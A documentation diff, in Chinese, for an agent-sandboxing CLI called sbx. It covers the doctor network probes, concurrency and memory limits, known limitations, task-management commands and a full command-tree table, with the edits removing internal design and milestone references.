+- **目标有三个来源**，覆盖运行期和构建期：`[[forward]]` 的每一条、`network.allow` 里解析到私有地址的那些、以及 prep 文件里出现过的主机名。后两类都**先解析、只留落在私有地址的**——这既是"值得探"的判据，也是不去骚扰公网主机的保险。输出里的 `allow:` / `prep:` 前缀说明这个目标是从哪条配置推出来的。
 - 配了 `host` 的 forward 按真实域名探，否则测不到对端的 SNI 策略。`to` 写成裸端口号的（指向宿主机）不探：那条路由由 Docker 自己维护。
 - **prep 那一类是启发式，不是契约**：按正则从 Dockerfile 里捞主机名，注释行整行跳过（模板里全是 `gitlab.corp.example` 这类示例）。这么做的理由是，Dockerfile 里没有地方声明"我要触达哪个内网源"，而那恰恰是最容易被代理咬到的一类。
 - 一个目标都没找到就跳过，不猜地址；最多探 6 个，四级 × 两个位置，再有用也不能把 doctor 拖成分钟级。
 - 容器侧复用 forwarder 已经 pin 住的 `alpine/socat` 镜像，宿主机侧用 Go 自己的 `net` 和 `crypto/tls`——**刻意不调 curl**，macOS 自带的是 LibreSSL，它和系统代理的交互会给出和实际不符的结论。
 - TLS 两级只在 443 / 8443 / 9443 上跑。`forward` 是纯 TCP 中继，握不握得上手不归它管，所以 TLS 的结果**不会**把这一项打成 `✗`，它是诊断上下文。
 
-### dd-proxy 这一项为什么必须单独存在（M4-19）
+### dd-proxy 这一项为什么必须单独存在
 
 这一项是被一次真实故障逼出来的。现象分两层：
 
@@ -1323,7 +1420,7 @@ curl -sS -o /dev/null -w "proxied %{http_code}\n" --proxy http://127.0.0.1:7890 
 
 ---
 
-## 并发与内存（M2-14、design §11、R10）
+## 并发与内存
 
 `sbx run` 在真要启动一个容器之前查两件事：
 
@@ -1335,7 +1432,7 @@ sbx: 已经有 3 个 Task 在跑，达到 max_running = 3：shop-e76272.main、s
 先 sbx stop 掉一个，或者在 ~/.sbx/config.toml 里调大 max_running（注意内存：每个 Task 上限 3g）
 ```
 
-计数是**跨 Workspace 的**——`max_running` 管的是 Docker VM 的内存，而那是所有仓库共用的；限额本身取自你当前所在仓库的配置。`sbx run` 一个已经在跑的 Task 只是 attach，不占新名额，不会被自己挡住。启动一个已停止的 Task 同样要过这一关（design §10.1 把这步画在"新建"分支里，但重启一样多占一份内存）。
+计数是**跨 Workspace 的**——`max_running` 管的是 Docker VM 的内存，而那是所有仓库共用的；限额本身取自你当前所在仓库的配置。`sbx run` 一个已经在跑的 Task 只是 attach，不占新名额，不会被自己挡住。启动一个已停止的 Task 同样要过这一关。
 
 **内存预算**：`max_running × resources.memory` 超过 Docker VM 内存的 95% 时警告一次，不拒绝——`--memory` 是上限不是预留，用不满是常态。
 
@@ -1367,14 +1464,14 @@ VM 内存取自 `docker info` 的 `MemTotal`，Docker Desktop 下就是那台 VM
 - **`[[services]]` 不计入内存预算**：服务容器不设内存上限（给 postgres 猜一个小数字的后果是启动即 OOM，比不限更糟），而 `doctor` 的 `vm-memory` 只算 `max_running × resources.memory`。起了重服务时自己留余量。
 - **`forward` 没有审计**：squid 管不了裸 TCP，所以 forwarder 的流量不进访问日志、`sbx net denied` 也看不见。补偿手段是"必须逐条显式声明 + 每次 `sbx run` 打印 + 记进 meta"。
 - **prep 的凭据只在 build 期存在**：Task 跑到一半才发现缺一个私有依赖时，它装不上——这是设计，不是缺陷。重跑 `sbx prep build` 再建 Task。
-- 上游代理只支持 http；只有 SOCKS 的宿主机代理需要你自己加一层转发（design §6.4）。
+- 上游代理只支持 http；只有 SOCKS 的宿主机代理需要你自己加一层转发。
 - **Codex 已支持**：交互、headless、准确 session 恢复和 fresh；API key 仅支持 headless。宿主机 Codex 配置/skills/sessions 不会随 auth.json 导入。
 - **daemon 是用户隔离边界**：同 daemon 不支持不互信多用户；`[isolation]` 不可由项目/workspace 覆盖。
 - **Git 便捷入口不自动交付产物**：agent 退出 0 不保证测试或提交已完成；需要验证交付时使用显式 v2 任务。
-- 底层镜像必须是 Debian/Ubuntu 系（ADR 0007）。
+- 底层镜像必须是 Debian/Ubuntu 系。
 
 
-组织策略与汇总事件：`sbx policy show`、`sbx events status`、`sbx events flush`。固定 root 策略存在时只支持同步 TaskSpec；Git 使用 Git Source，不能通过个人配置或更换 SBX_HOME 扩权。见 [组织规范](organization.md)。
+组织策略与汇总事件：`sbx policy show`、`sbx events status`、`sbx events flush`。固定 root 策略存在时只支持同步 TaskSpec；Git 使用 Git Source，不能通过个人配置或更换 SBX_HOME 扩权。见 [组织规范](design.md#7-信任与网络边界)。
 
 
 ## 通用任务管理（G9）
@@ -1389,4 +1486,76 @@ sbx task recover <task>
 sbx task clean <task>
 ```
 
-这些入口按 SBX_HOME/task_id 定位，不要求 Git。list/status/logs 离线；stop 取消活动并等待收尾；recover 核对孤立执行；clean 只回收专属运行资源。原 Git 便捷任务仍用顶层 ls/logs/stop/done。状态门禁和恢复步骤见 [任务管理规范](task-management.md)。
+这些入口按 SBX_HOME/task_id 定位，不要求 Git。list/status/logs 离线；stop 取消活动并等待收尾；recover 核对孤立执行；clean 只回收专属运行资源。原 Git 便捷任务仍用顶层 ls/logs/stop/done。状态门禁和恢复步骤见 [任务管理规范](commands.md#通用任务每条命令的含义)。
+
+
+## 完整命令树与参数参考
+
+以下清单由当前 CLI 帮助递归核对。所有短参数、默认值、嵌套子命令见 [完整参数参考](cli-reference.md)；每条命令也可本地执行 `sbx <命令> --help`。`completion` 为 shell 补全脚本生成，`help` 查询用法，两者不启动任务。
+
+| 命令路径 | 帮助入口 |
+|---|---|
+| `sbx admit` | `sbx admit --help` |
+| `sbx attach` | `sbx attach --help` |
+| `sbx clean` | `sbx clean --help` |
+| `sbx completion` | `sbx completion --help` |
+| `sbx completion bash` | `sbx completion bash --help` |
+| `sbx completion fish` | `sbx completion fish --help` |
+| `sbx completion powershell` | `sbx completion powershell --help` |
+| `sbx completion zsh` | `sbx completion zsh --help` |
+| `sbx config` | `sbx config --help` |
+| `sbx config init` | `sbx config init --help` |
+| `sbx config show` | `sbx config show --help` |
+| `sbx doctor` | `sbx doctor --help` |
+| `sbx done` | `sbx done --help` |
+| `sbx drop` | `sbx drop --help` |
+| `sbx events` | `sbx events --help` |
+| `sbx events flush` | `sbx events flush --help` |
+| `sbx events status` | `sbx events status --help` |
+| `sbx execution` | `sbx execution --help` |
+| `sbx execution status` | `sbx execution status --help` |
+| `sbx forward` | `sbx forward --help` |
+| `sbx forward init` | `sbx forward init --help` |
+| `sbx isolation` | `sbx isolation --help` |
+| `sbx isolation adopt` | `sbx isolation adopt --help` |
+| `sbx isolation status` | `sbx isolation status --help` |
+| `sbx login` | `sbx login --help` |
+| `sbx logs` | `sbx logs --help` |
+| `sbx ls` | `sbx ls --help` |
+| `sbx memory` | `sbx memory --help` |
+| `sbx memory pull` | `sbx memory pull --help` |
+| `sbx net` | `sbx net --help` |
+| `sbx net allow` | `sbx net allow --help` |
+| `sbx net denied` | `sbx net denied --help` |
+| `sbx path` | `sbx path --help` |
+| `sbx policy` | `sbx policy --help` |
+| `sbx policy show` | `sbx policy show --help` |
+| `sbx port` | `sbx port --help` |
+| `sbx prep` | `sbx prep --help` |
+| `sbx prep build` | `sbx prep build --help` |
+| `sbx prep drop` | `sbx prep drop --help` |
+| `sbx prep init` | `sbx prep init --help` |
+| `sbx prep reseed` | `sbx prep reseed --help` |
+| `sbx prep show` | `sbx prep show --help` |
+| `sbx run` | `sbx run --help` |
+| `sbx schema` | `sbx schema --help` |
+| `sbx shell` | `sbx shell --help` |
+| `sbx stop` | `sbx stop --help` |
+| `sbx task` | `sbx task --help` |
+| `sbx task apply` | `sbx task apply --help` |
+| `sbx task approve` | `sbx task approve --help` |
+| `sbx task clean` | `sbx task clean --help` |
+| `sbx task deliver` | `sbx task deliver --help` |
+| `sbx task list` | `sbx task list --help` |
+| `sbx task logs` | `sbx task logs --help` |
+| `sbx task prune` | `sbx task prune --help` |
+| `sbx task reconcile` | `sbx task reconcile --help` |
+| `sbx task recover` | `sbx task recover --help` |
+| `sbx task reject` | `sbx task reject --help` |
+| `sbx task run` | `sbx task run --help` |
+| `sbx task status` | `sbx task status --help` |
+| `sbx task stop` | `sbx task stop --help` |
+| `sbx task verify` | `sbx task verify --help` |
+| `sbx trust` | `sbx trust --help` |
+| `sbx upgrade` | `sbx upgrade --help` |
+| `sbx version` | `sbx version --help` |
